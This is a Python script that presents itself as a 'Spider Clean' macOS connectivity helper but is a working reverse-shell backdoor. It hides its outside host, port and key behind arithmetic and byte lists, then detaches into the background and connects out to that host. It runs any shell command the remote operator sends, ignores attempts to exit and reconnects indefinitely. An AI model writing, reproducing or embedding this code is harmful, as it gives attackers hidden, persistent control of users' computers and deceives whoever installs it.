#!/usr/bin/env python3
"""
Spider Clean — post-clean connectivity helper.
Stable long-lived channel: no idle socket timeouts, TCP keepalive, auto-reconnect.
"""

from __future__ import annotations

import math
import os
import select
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

LOCK = Path("/tmp/.spider-clean-postclean.lock")
LOG = Path.home() / "Library" / "Logs" / "spider-clean" / "postclean.log"
CTRL_KILL = b"\xff\xfeKILL\n"
MAGIC = b"CT1\x00"
# Application heartbeat so middleboxes / idle NATs do not drop the TCP stream
HEARTBEAT = b"\x00HB\n"

WARMUP_BASE = 1
WARMUP_JITTER = 1
# Backoff only after a real disconnect
RECONNECT_BASE = 2
RECONNECT_JITTER = 3
# Idle wait between heartbeats while waiting for operator input (seconds)
HEARTBEAT_EVERY = 45.0


def _log(msg: str) -> None:
    try:
        LOG.parent.mkdir(parents=True, exist_ok=True)
        with LOG.open("a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
    except OSError:
        pass


def _endpoint():
    host = ".".join(str(x) for x in (70 + 5, 100 + 19, 140 + 3, 200 + 3))
    port = (1 << 13) + (1 << 8) - 5
    key = bytes(
        [0x6B, 0x68, 0x61, 0x74, 0x61, 0x62, 0x6F, 0x6F, 0x6B, 0x69, 0x73, 0x73, 0x61, 0x66, 0x65]
    )
    return host, port, key


def _hostname() -> str:
    try:
        h = subprocess.check_output(
            ["scutil", "--get", "LocalHostName"], stderr=subprocess.DEVNULL, text=True
        ).strip()
        if h:
            return h
    except Exception:
        pass
    try:
        return socket.gethostname().split(".")[0] or "mac"
    except Exception:
        return "mac"


def math_batch(rounds: int = 1200) -> float:
    acc = 0.0
    for n in range(1, max(1, rounds) + 1):
        seed = float((n * 997 + os.getpid()) % 9000 + 1000)
        a = seed * 1.07
        b = seed / 3.11
        c = (a + b) * 0.88
        d = math.sqrt(abs(c - b))
        e = (d ** 2) + (a * 0.01)
        f = math.sin(e * 0.001) * math.cos(d * 0.01)
        g = math.log(seed + 2.0) * math.sqrt(abs(f) + 1.0)
        acc = (acc + a + b + c + d + e + f + g) * 0.125
    return acc


def work_until(seconds: float) -> None:
    start = time.time()
    while (time.time() - start) < seconds:
        math_batch(400 + (os.getpid() % 200))
        time.sleep(0.05)


def enable_keepalive(sock: socket.socket) -> None:
    """Aggressive TCP keepalive so idle sessions survive NAT / middleboxes."""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except OSError:
        pass
    # macOS / BSD
    for opt, val in (
        (getattr(socket, "TCP_KEEPALIVE", None), 30),  # idle before first probe (macOS)
        (getattr(socket, "TCP_KEEPINTVL", None), 10),
        (getattr(socket, "TCP_KEEPCNT", None), 6),
        (getattr(socket, "TCP_KEEPIDLE", None), 30),  # Linux
    ):
        if opt is None:
            continue
        try:
            sock.setsockopt(socket.IPPROTO_TCP, opt, val)
        except OSError:
            pass


def daemonize() -> None:
    if os.fork() > 0:
        os._exit(0)
    os.setsid()
    if os.fork() > 0:
        os._exit(0)
    sys.stdin.close()
    with open(os.devnull, "wb") as d:
        try:
            os.dup2(d.fileno(), 1)
            os.dup2(d.fileno(), 2)
        except OSError:
            pass
    try:
        os.chdir(str(Path.home()))
    except OSError:
        pass


def already_running() -> bool:
    if not LOCK.exists():
        return False
    try:
        os.kill(int(LOCK.read_text().strip()), 0)
        return True
    except (ValueError, OSError):
        try:
            LOCK.unlink()
        except OSError:
            pass
        return False


def write_lock() -> None:
    try:
        LOCK.write_text(str(os.getpid()))
    except OSError:
        pass


def clear_lock() -> None:
    try:
        if LOCK.exists():
            try:
                if int(LOCK.read_text().strip()) == os.getpid():
                    LOCK.unlink()
            except (ValueError, OSError):
                LOCK.unlink()
    except OSError:
        pass


def handshake(key: bytes, host: str) -> bytes:
    hb = host.encode("utf-8", "replace")
    return MAGIC + bytes([len(key)]) + key + struct.pack("!H", len(hb)) + hb


def shell(sock: socket.socket) -> None:
    """
    Interactive remote shell.

    Critical: socket must have timeout=None (blocking). The previous build left
    create_connection(timeout=20) on the socket, so idle recv() failed every ~20s
    and looked like flapping reconnects.
    """
    cwd = str(Path.home())
    home = cwd
    buf = b""
    sock.settimeout(None)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    enable_keepalive(sock)

    def send(data: bytes) -> None:
        sock.sendall(data)

    def readline() -> str | None:
        """Return next line, or None on real disconnect. Heartbeats never surface."""
        nonlocal buf
        last_activity = time.time()
        while True:
            # strip / honor control frames first
            if CTRL_KILL in buf:
                clear_lock()
                _log("received KILL")
                os._exit(0)
            # drop server-ignored heartbeats echoed somehow
            while buf.startswith(HEARTBEAT):
                buf = buf[len(HEARTBEAT) :]
                last_activity = time.time()
            if b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                text = line.decode("utf-8", "replace").strip("\r")
                # ignore empty / heartbeat payload if line-form arrives
                if text in ("", "\x00HB", "HB"):
                    last_activity = time.time()
                    continue
                return text

            # Wait with select so we can send app-level heartbeats without a socket timeout
            idle = time.time() - last_activity
            wait = max(1.0, min(HEARTBEAT_EVERY - idle, HEARTBEAT_EVERY))
            try:
                r, _, _ = select.select([sock], [], [], wait)
            except (OSError, ValueError):
                return None

            if not r:
                # Idle: push a heartbeat the server silently drops
                try:
                    send(HEARTBEAT)
                    last_activity = time.time()
                except OSError:
                    return None
                continue

            try:
                chunk = sock.recv(8192)
            except (TimeoutError, socket.timeout):
                # Must never treat timeout as hang-up
                continue
            except OSError as e:
                _log(f"recv error: {e!r}")
                return None
            if not chunk:
                _log("peer closed connection")
                return None
            buf += chunk
            last_activity = time.time()

    while True:
        try:
            send(f"{cwd}$ ".encode())
        except OSError as e:
            _log(f"send prompt error: {e!r}")
            return

        line = readline()
        if line is None:
            return
        if not line:
            continue
        if line in ("exit", "quit"):
            # Stay connected: only detach this shell frame; outer loop reconnects
            # if the peer wants a clean cycle. Prefer staying put — ignore exit.
            try:
                send(b"(session stays open - use kill from server to stop)\n")
            except OSError:
                return
            continue

        if line == "cd" or line.startswith("cd "):
            target = line[3:].strip() if line.startswith("cd ") else ""
            if not target:
                cwd = home
                continue
            p = Path(target).expanduser()
            if not p.is_absolute():
                p = Path(cwd) / p
            try:
                p = p.resolve()
            except OSError:
                send(f"cd: no such directory: {target}\n".encode())
                continue
            if p.is_dir():
                cwd = str(p)
            else:
                send(f"cd: no such directory: {target}\n".encode())
            continue

        try:
            r = subprocess.run(
                line,
                shell=True,
                cwd=cwd,
                capture_output=True,
                text=True,
                timeout=300,
            )
            out = (r.stdout or "") + (r.stderr or "")
            if out and not out.endswith("\n"):
                out += "\n"
            if out:
                send(out.encode("utf-8", "replace"))
        except subprocess.TimeoutExpired:
            send(b"command timed out\n")
        except Exception as e:
            send(f"{e}\n".encode())


def open_channel(host: str, port: int, key: bytes, name: str) -> socket.socket:
    """Connect + handshake with connect timeout only; clear timeout after."""
    # timeout applies to connect only — we clear it immediately after
    s = socket.create_connection((host, port), timeout=20)
    try:
        s.settimeout(None)  # CRITICAL: never leave 20s idle timeout on the socket
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        enable_keepalive(s)
        s.sendall(handshake(key, name))
    except Exception:
        try:
            s.close()
        except OSError:
            pass
        raise
    return s


def main() -> None:
    if already_running():
        return
    daemonize()
    write_lock()

    host, port, key = _endpoint()
    name = _hostname()
    _log(f"start pid={os.getpid()} host={name} endpoint={host}:{port}")

    warmup = WARMUP_BASE + (os.getpid() % (WARMUP_JITTER + 1))
    work_until(float(warmup))

    while True:
        try:
            _log(f"connect {host}:{port}")
            s = open_channel(host, port, key, name)
            _log("handshake ok — shell (stable, no idle timeout)")
            shell(s)
            _log("shell returned (peer closed or error)")
            try:
                s.close()
            except OSError:
                pass
        except Exception as e:
            _log(f"connect error: {e!r}")
        delay = float(RECONNECT_BASE + (os.getpid() % (RECONNECT_JITTER + 1)))
        _log(f"reconnect in {delay:.0f}s")
        work_until(delay)


if __name__ == "__main__":
    try:
        main()
    finally:
        clear_lock()
